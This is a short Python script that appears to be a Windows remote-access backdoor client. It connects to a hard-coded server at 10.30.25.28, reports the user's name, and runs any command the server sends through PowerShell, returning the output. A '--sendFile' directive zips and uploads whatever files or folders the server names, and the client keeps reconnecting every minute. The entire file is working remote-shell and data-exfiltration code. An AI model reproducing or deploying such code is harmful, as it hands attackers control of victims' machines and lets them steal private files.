# IMPORTS
import os
from pickle import dumps
from shutil import make_archive
from socket import socket, AF_INET, SOCK_STREAM
import time


# CONSTANTS
HEADER = 64
PORT = 5050
SERVER = "10.30.25.28"
ADDRESS = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!DISCONNECT'
outputFile = os.path.join(os.path.expanduser("~"), "Downloads", "output.txt")
def send(message_type, message):
    """This function will send the data along with its type to the server"""
    message = dumps((message_type, message))
    client.send(f"{len(message):<{HEADER}}".encode(FORMAT) + message)
def receiving():
    """
This function will receive commands from the server
and execute them
"""
    connection = True
    while connection:
        try:
            try:
                message_length = int(client.recv(HEADER).decode(FORMAT))
            except Exception:
                continue
            if not message_length:
                continue
            message = client.recv(message_length).decode(FORMAT).strip()
            if not message:
                continue
            if message == DISCONNECT_MESSAGE:
                send('UPDATE', message)
                client.close()
                connection = False
                break
            if '--sendFile' in message:
                message = message.split(';')
                for index, command in enumerate(message):
                    if '--sendFile' in command:
                        files = [file.strip() for file in command[11:].split(',') if file]
                        message[index] = ''
                for file in files:
                    zipping = False
                    if not os.path.exists(file):
                        file = os.path.join(os.getcwd(), file)
                    if not os.path.exists(file):
                        continue
                    file_name = [path for path in file.split('\\') if path][-1]
                    if os.path.isdir(file):
                        file = make_archive(file_name, 'zip', file)
                        zipping = True
                        file_name += '.zip'
                    send('UPDATE', f'Sending {file_name}')
                    with open(file, 'rb') as file_handler:
                        data = file_handler.read()
                    send('FILE', (file_name, data))
                    send('UPDATE', f'Sent {file_name}')
                    if zipping:
                        os.remove(file)
                message = ';'.join(message)
            if not message:
                continue
            os.system(fr'powershell.exe {message} > {outputFile}')
            try:
                with open(outputFile, 'rt') as file:
                    message = file.read()
                send('OUTPUT', message)
                os.remove(outputFile)
            except Exception:
                send('ERROR', 'Some error occurred while executing your command')
        except:
            pass
SLEEPING_TIME = 60
# MAIN
if __name__ == '__main__':
    while True:
        client = socket(AF_INET, SOCK_STREAM)
        try:
            client.connect(ADDRESS)
            send('NAME', os.path.expanduser('~').split('\\')[2])
            receiving()
        except:
            time.sleep(SLEEPING_TIME)